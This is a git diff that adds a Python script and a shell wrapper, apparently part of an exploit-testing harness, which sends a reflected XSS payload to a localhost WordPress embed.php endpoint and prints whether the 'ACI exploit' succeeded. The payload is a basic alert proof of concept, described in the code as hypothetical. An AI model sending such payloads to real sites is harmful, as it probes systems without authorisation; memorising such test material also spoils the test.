
diff --git a/ACI_unit_test.py b/ACI_unit_test.py
new file mode 100644
index 0000000000..ca7ecd064e
--- /dev/null
+++ b/ACI_unit_test.py
@@ -0,0 +1,20 @@
+import requests
+
+# Simulate the environment where the exploit will be tested
+# Assuming the WordPress site is locally hosted on http://localhost
+url = "http://localhost/wp-includes/embed.php"
+
+# Crafted payload that attempts to exploit the XSS vulnerability in YouTube URL embeds
+# This is a hypothetical example and may need adjustments based on actual WordPress configuration and setup
+payload = {
+    "embed_url": "<script>alert('XSS');</script>"
+}
+
+# Send a POST request to simulate embedding a YouTube URL
+response = requests.post(url, data=payload)
+
+# Check if the payload is executed as part of the response content
+if "<script>alert('XSS');</script>" in response.text:
+    print("The ACI exploit success!!!")
+else:
+    print("The ACI exploit failed!!!")
diff --git a/ACI_unit_test.sh b/ACI_unit_test.sh
new file mode 100755
index 0000000000..30cd8866b8
--- /dev/null
+++ b/ACI_unit_test.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+# Script to set up the environment and run the ACI_unit_test.py for CVE exploitation
+
+# Assuming the necessary environment setup for WordPress is already handled.
+# This script focuses on running the Python script to test the CVE.
+
+echo "Running the ACI exploit test..."
+python ACI_unit_test.py
